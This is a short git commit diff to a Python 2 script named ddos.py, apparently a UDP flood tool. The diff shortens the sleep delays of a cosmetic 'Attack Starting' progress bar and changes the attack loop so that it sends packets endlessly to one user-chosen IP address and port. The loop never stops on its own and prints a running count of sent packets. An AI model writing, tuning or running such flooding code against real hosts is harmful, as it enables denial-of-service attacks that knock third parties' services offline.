f26d1475ddd58a47142255b4adb410210caa229b
liguoqing19861028@163.com <liguoqing19861028@163.com>
2018-11-28 17:14:48 +0800

    111

--- python/common/ddos.py
+++ python/common/ddos.py
@@ -27,20 +27,20 @@ port = input("Port       : ")
 os.system("clear")
 os.system("figlet Attack Starting")
 print "[                    ] 0% "
-time.sleep(3)
+time.sleep(2)
 print "[=====               ] 25%"
-time.sleep(3)
+time.sleep(2)
 print "[==========          ] 50%"
-time.sleep(3)
+time.sleep(2)
 print "[===============     ] 75%"
-time.sleep(3)
+time.sleep(2)
 print "[====================] 100%"
-time.sleep(3)
+time.sleep(2)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
-     port = port + 1
+     port = port 
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
